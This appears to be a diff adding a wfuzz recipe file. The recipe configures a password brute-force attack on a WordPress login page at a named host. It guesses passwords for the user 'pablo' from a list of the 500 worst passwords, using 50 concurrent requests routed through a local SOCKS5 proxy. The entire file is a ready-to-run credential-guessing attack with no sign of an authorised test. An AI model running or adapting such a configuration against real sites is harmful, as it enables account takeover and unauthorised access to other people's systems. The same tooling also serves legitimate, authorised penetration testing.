@@ -1,0 +1,30 @@
+{
+    "version": "0.2",
+    "wfuzz_recipe": {
+        "colour": true,
+        "concurrent": 50,
+        "conn_delay": 5,
+        "hs": "ERROR",
+        "payloads": [
+            [
+                "file",
+                {
+                    "default": "500-worst-passwords.txt",
+                    "encoder": null
+                },
+                null
+            ]
+        ],
+        "postdata": "log=pablo&pwd=FUZZ",
+        "proxies": [
+            [
+                "localhost",
+                "1337",
+                "SOCKS5"
+            ]
+        ],
+        "scanmode": true,
+        "url": "http://pi.hxx.pw/wp-login.php",
+        "verbose": true
+    }
+}
